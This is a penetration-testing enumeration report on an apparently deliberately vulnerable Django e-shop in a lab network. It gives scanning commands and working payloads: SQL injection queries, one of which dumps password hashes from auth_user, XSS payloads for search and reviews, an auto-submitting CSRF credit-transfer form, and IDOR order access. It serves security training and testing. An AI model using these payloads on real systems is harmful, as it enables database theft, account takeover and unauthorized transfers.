# Enumeration Phase - Complete Penetration Testing Report

## Overview
**Target**: E-Shop Web Application  
**Testing Environment**: Kali Linux VM (10.211.55.4) → macOS Host (10.211.55.2)  
**Objective**: Comprehensive enumeration to discover attack vectors and vulnerabilities  
**Methodology**: OWASP Web Security Testing Guide v4.2  

## Executive Summary

This document details the complete enumeration phase of our penetration testing engagement. Through systematic information gathering and analysis, we identified multiple security weaknesses including SQL injection points, authentication flaws, XSS vulnerabilities, CSRF gaps, and access control issues. Our methodology follows industry best practices, utilizing both automated tools and manual testing techniques.

---

## Phase 1: Initial Reconnaissance

### 1.1 Network Discovery

**[SCREENSHOT - Network Setup Verification]**
```bash
# From Kali VM terminal
ip addr show
# Screenshot showing Kali IP: 10.211.55.4

# Verify target accessibility
ping -c 4 10.211.55.2
# Screenshot showing successful ping responses
```

### 1.2 Port Scanning

**[SCREENSHOT - Nmap Initial Scan]**
```bash
# Quick TCP scan
sudo nmap -sS -F 10.211.55.2
# Screenshot showing open ports

# Detailed service scan
sudo nmap -sV -sC -p- 10.211.55.2 -oA eshop_full_scan
# Screenshot of results showing:
# - Port 8000/tcp open (Django development server)
```

**[SCREENSHOT - Service Detection]**
```bash
# HTTP service enumeration
sudo nmap -p 8000 --script http-enum,http-headers,http-methods 10.211.55.2
# Screenshot showing HTTP headers and methods
```

### 1.3 Web Service Identification

**[SCREENSHOT - Whatweb Analysis]**
```bash
whatweb http://10.211.55.2:8000 -v
# Screenshot showing:
# - Django framework detection
# - Python version hints
# - Cookie names (sessionid, csrftoken)
```

**[SCREENSHOT - Curl Headers]**
```bash
curl -I http://10.211.55.2:8000
curl -I http://10.211.55.2:8000/login/
# Screenshot showing response headers
# Note: No security headers (X-Frame-Options, CSP, etc.)
```

---

## Phase 2: Web Application Mapping

### 2.1 Directory and File Discovery

**[SCREENSHOT - Gobuster Directory Scan]**
```bash
# Directory enumeration
gobuster dir -u http://10.211.55.2:8000 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,js,py -t 50 \
  -o gobuster_results.txt

# Screenshot showing discovered paths:
# /login/ (Status: 200)
# /logout/ (Status: 302)
# /catalog/ (Status: 302 - requires auth)
# /profile/ (Status: 302 - requires auth)
# /my-orders/ (Status: 302 - requires auth)
# /transfer-credits/ (Status: 302 - requires auth)
# /admin/ (Status: 302)
# /static/ (Status: 301)
# /media/ (Status: 301)
```

**[SCREENSHOT - Authenticated Endpoint Discovery]**
```bash
# After login, additional endpoints become accessible:
# /catalog/?q=<search> - Product search (SQL INJECTION!)
# /product/<uuid>/ - Product details
# /product/<uuid>/review/ - Submit reviews (XSS!)
# /order/<order_id>/ - View orders (IDOR!)
# /transfer-credits/ - Credit transfers (CSRF!)
# /update-email/ - Email updates (CSRF!)
```

### 2.2 Technology Stack Fingerprinting

**[SCREENSHOT - Wappalyzer in Firefox]**
```bash
# From Kali Firefox
1. Install Wappalyzer extension
2. Browse to http://10.211.55.2:8000
# Screenshot showing detected technologies:
# - Django Web Framework
# - Python
# - SQLite database (from error messages)
# - Bootstrap CSS framework
```

**[SCREENSHOT - Browser Developer Tools]**
```bash
# Firefox Developer Tools (F12)
1. Network tab while browsing
2. Check response headers
# Screenshot showing:
# - Server: WSGIServer/0.2 CPython/3.x
# - Set-Cookie headers revealing session management
# - Missing security headers
```

### 2.3 Application Navigation Structure

**[SCREENSHOT - Main Navigation]**
```bash
# After authentication, navigation reveals:
# - Κατάλογος (Catalog) - Product listing
# - Καλάθι (Cart) - Shopping cart
# - Προφίλ (Profile) - User profile with CSRF vulnerable forms
# - Οι Παραγγελίες μου (My Orders) - Order history with IDOR
# - Αποσύνδεση (Logout) - Logout functionality
```

---

## Phase 3: Authentication Mechanism Analysis

### 3.1 Login Page Discovery

**[SCREENSHOT - Login Form Analysis]**
```bash
firefox http://10.211.55.2:8000/login/
# Screenshot showing:
# - Username/password fields
# - CSRF token present
# - No CAPTCHA implementation (VULNERABILITY!)
# - Greek interface text
```

**[SCREENSHOT - View Source]**
```bash
# Right-click → View Page Source
# Screenshot highlighting:
# - Form action="{% url 'eshop:login' %}"
# - CSRF token in hidden field
# - No CAPTCHA or rate limiting code
```

### 3.2 Authentication Testing

**[SCREENSHOT - User Enumeration]**
```bash
# Test 1: Valid username, wrong password
Username: admin
Password: wrongpass
# Screenshot showing error: "Invalid password for user 'admin'"

# Test 2: Invalid username
Username: doesnotexist
Password: test
# Screenshot showing different error: "Username 'doesnotexist' does not exist in our system"
# USER ENUMERATION VULNERABILITY CONFIRMED!
```

**[SCREENSHOT - Successful Login]**
```bash
# Valid credentials
Username: admin
Password: admin123
# Screenshot showing redirect to catalog page
```

### 3.3 Session Management Analysis

**[SCREENSHOT - Cookie Analysis]**
```bash
# After successful login
# Firefox Developer Tools → Storage → Cookies
# Screenshot showing:
# - sessionid cookie (HttpOnly: False - VULNERABILITY!)
# - csrftoken cookie
# - No Secure flag (VULNERABILITY!)
# - No SameSite attribute properly set
```

**[SCREENSHOT - Session Hijacking Test]**
```bash
# JavaScript console test
document.cookie
# Screenshot showing session cookie accessible via JavaScript
# This enables XSS → Session Hijacking attacks
```

---

## Phase 4: Input Point Identification

### 4.1 GET Parameters

**[SCREENSHOT - URL Parameter Discovery]**
```bash
# Manual browsing reveals:
/catalog/?q=search_term          # Search functionality (SQL Injection)
/product/<uuid>/                 # Product details (UUID format)
/order/<order_id>/              # Order viewing (Custom ID: ORD-XXXXX-XXXXX)
/profile/                       # User profile page
/my-orders/                     # Order listing

# Screenshot of each endpoint in browser
```

### 4.2 POST Endpoints

**[SCREENSHOT - Form Analysis with Burp]**
```bash
# Identify all forms using Burp Suite
1. Browse entire application with Burp proxy
2. Target → Site map → Filter by "POST"
# Screenshot showing POST endpoints:
# - /login/ (authentication)
# - /logout/ (logout - uses CSRF)
# - /add-to-cart/ (AJAX - requires CSRF)
# - /update-cart-item/ (AJAX)
# - /payment/ (checkout process)
# - /product/<uuid>/review/ (product reviews - XSS vulnerable)
# - /transfer-credits/ (CSRF vulnerable - @csrf_exempt!)
# - /update-email/ (CSRF vulnerable - @csrf_exempt!)
```

### 4.3 AJAX Endpoints

**[SCREENSHOT - Browser Network Tab]**
```bash
# Discovering AJAX calls
1. Open Network tab in Firefox
2. Add item to cart
# Screenshot showing:
# - POST /add-to-cart/
# - JSON request/response
# - X-CSRFToken header present (proper implementation here)
```

---

## Phase 5: Vulnerability Indicators Discovery

### 5.1 SQL Injection Indicators

**[SCREENSHOT - Search Function Testing]**
```bash
# Basic SQL injection test
firefox "http://10.211.55.2:8000/catalog/?q='"
# Screenshot showing SQL error message:
# "Database error: no such column: ..."

# Boolean test
firefox "http://10.211.55.2:8000/catalog/?q=' OR '1'='1"
# Screenshot showing ALL products returned (SQL INJECTION CONFIRMED!)
```

**[SCREENSHOT - Error-based SQL Injection]**
```bash
# Force database error
firefox "http://10.211.55.2:8000/catalog/?q=' UNION SELECT 1,2,3,4,5,6--"
# Screenshot showing error revealing:
# - SQLite database in use
# - Table structure hints
# - Column count information
```

### 5.2 XSS Detection

**[SCREENSHOT - Reflected XSS Test]**
```bash
# Test in search box
firefox "http://10.211.55.2:8000/catalog/?q=<script>alert('XSS')</script>"
# Screenshot showing search term reflected without encoding
```

**[SCREENSHOT - Stored XSS in Reviews]**
```bash
# Test in product review
1. Navigate to any product page
2. Submit review with:
   Title: Test Review <script>alert('XSS')</script>
   Content: <img src=x onerror=alert('Stored-XSS')>
   Rating: 5
# Screenshot showing XSS triggered on page reload
```

### 5.3 Access Control Testing

**[SCREENSHOT - IDOR Detection]**
```bash
# Order enumeration
# As logged in user, view your order:
firefox http://10.211.55.2:8000/order/ORD-ABCDE-12345/

# Try accessing another order:
firefox http://10.211.55.2:8000/order/ORD-FGHIJ-67890/
# Screenshot showing another user's order details (IDOR VULNERABILITY!)
# Note: Order IDs use format ORD-XXXXX-XXXXX (not sequential integers)
```

### 5.4 CSRF Vulnerability Detection

**[SCREENSHOT - Profile Page Forms]**
```bash
# Navigate to profile page
firefox http://10.211.55.2:8000/profile/
# Screenshot showing two forms WITHOUT CSRF tokens:
# - Update Email form
# - Transfer Credits form
```

**[SCREENSHOT - CSRF Test with Burp]**
```bash
# Burp Repeater test
1. Capture transfer-credits request
2. Note: NO CSRF token in request
3. Create HTML PoC:
<form action="http://10.211.55.2:8000/transfer-credits/" method="POST">
  <input name="recipient" value="attacker">
  <input name="amount" value="9999">
</form>
<script>document.forms[0].submit()</script>
# Screenshot showing successful transfer without CSRF token!
```

---

## Phase 6: Debug Mode and Information Disclosure

### 6.1 Debug Mode Detection

**[SCREENSHOT - 404 Error Page]**
```bash
# Force 404 error
firefox http://10.211.55.2:8000/nonexistent/
# Screenshot showing Django debug page with:
# - Full file paths
# - URL patterns list
# - Settings information
# - DEBUG = True confirmed
```

**[SCREENSHOT - SQL Error Details]**
```bash
# Trigger SQL error
firefox "http://10.211.55.2:8000/catalog/?q='"
# Screenshot showing:
# - Full SQL query
# - Database backend (SQLite)
# - File paths
# - Code context
```

### 6.2 Password Storage Analysis

**[SCREENSHOT - SQL Injection Data Extraction]**
```bash
# Extract password hashes via SQL injection
firefox "http://10.211.55.2:8000/catalog/?q=' UNION SELECT 1,username||':'||password,3,4,5,6 FROM auth_user--"
# Screenshot showing:
# - MD5 password hashes (weak hashing algorithm!)
# - Format: username:hash
```

---

## Phase 7: Security Headers Analysis

**[SCREENSHOT - Missing Security Headers]**
```bash
# Check security headers
curl -I http://10.211.55.2:8000/ | grep -E "(X-Frame|X-Content|Content-Security|Strict)"
# Screenshot showing NO security headers:
# Missing:
# - X-Frame-Options
# - X-Content-Type-Options  
# - Content-Security-Policy
# - Strict-Transport-Security
# - X-XSS-Protection
```

---

## Phase 8: Automated Scanning Results

### 8.1 SQLMap Confirmation

**[SCREENSHOT - SQLMap Results]**
```bash
sqlmap -u "http://10.211.55.2:8000/catalog/?q=test" \
       --cookie="sessionid=YOUR_SESSION_ID" \
       --batch --dbs
# Screenshot showing:
# - Parameter 'q' is vulnerable
# - Database: SQLite
# - Injection types: Boolean-based blind, Error-based, UNION query
```

### 8.2 OWASP ZAP Active Scan

**[SCREENSHOT - ZAP Scan Results]**
```bash
# After authenticated scan
# Screenshot showing alerts:
# - SQL Injection (High) - /catalog/?q=
# - Cross Site Scripting (High) - Product reviews
# - Absence of Anti-CSRF Tokens (Medium) - Multiple forms
# - Cookie Without Secure Flag (Medium)
# - Cookie Without HttpOnly Flag (Medium)
# - X-Frame-Options Header Not Set (Medium)
```

---

## Vulnerability Summary Matrix

Based on our enumeration, we discovered:

| Finding | Location | Severity | Confirmation Method |
|---------|----------|----------|---------------------|
| SQL Injection | `/catalog/?q=` | CRITICAL | Manual + SQLMap |
| Stored XSS | Product reviews | HIGH | Manual testing |
| Reflected XSS | Search results | MEDIUM | Manual testing |
| IDOR | `/order/<id>/` | HIGH | Direct access test |
| Missing CSRF | `/transfer-credits/`, `/update-email/` | HIGH | Burp Repeater |
| User Enumeration | Login error messages | MEDIUM | Different responses |
| Weak Password Hash | MD5 in database | HIGH | SQL injection |
| Session Cookie Issues | No HttpOnly/Secure | MEDIUM | Browser DevTools |
| Debug Mode | Django DEBUG=True | HIGH | Error pages |
| Missing Security Headers | All responses | LOW | Curl analysis |

---

## Enumeration Checklist

### Completed Tasks:
- [x] Port scanning and service detection
- [x] Technology stack identification  
- [x] Authentication mechanism analysis
- [x] Session management review
- [x] Input point mapping (GET/POST)
- [x] SQL injection testing
- [x] XSS vulnerability detection
- [x] Access control verification
- [x] CSRF protection analysis
- [x] Security headers check
- [x] Information disclosure review
- [x] Password storage analysis
- [x] Debug mode detection

### Key Findings:
1. **Authentication Bypass**: SQL injection allows authentication bypass
2. **Data Exfiltration**: Complete database dump possible via SQLi
3. **Session Hijacking**: XSS + non-HttpOnly cookies = stolen sessions
4. **Unauthorized Access**: IDOR allows viewing any order
5. **State Changing Attacks**: CSRF allows unauthorized transfers
6. **Information Disclosure**: Debug mode reveals sensitive data
7. **Weak Cryptography**: MD5 password hashes easily crackable

---

## Attack Surface Summary

### External Attack Vectors:
1. **Unauthenticated**:
   - Login page (user enumeration, brute force)
   - Static resources
   
2. **Authenticated Required**:
   - SQL Injection (catalog search)
   - XSS (product reviews)
   - IDOR (order viewing)
   - CSRF (profile actions)

### Attack Chains Identified:
1. **Complete Account Takeover**:
   - SQL Injection → Extract passwords → Crack MD5 → Login
   
2. **Session Hijacking**:
   - XSS → Steal session cookie → Impersonate user
   
3. **Unauthorized Actions**:
   - CSRF → Transfer credits/change email without user knowledge
   
4. **Data Breach**:
   - SQL Injection → Dump entire database → Access all user data

---

## Next Steps

With enumeration complete, proceed to exploitation:

1. **SQL Injection Exploitation** (01_SQL_INJECTION.md)
2. **XSS Payload Development** (02_XSS_VULNERABILITIES.md)  
3. **Authentication Attacks** (03_AUTHENTICATION_WEAKNESSES.md)
4. **IDOR Exploitation** (04_IDOR_VULNERABILITY.md)
5. **CSRF Attack Development** (05_CSRF_VULNERABILITY.md)

Each vulnerability has been confirmed and is ready for full exploitation in the penetration testing engagement.

---

**Note**: This enumeration was performed in a controlled environment with proper authorization. All findings should be reported to the application owner for remediation.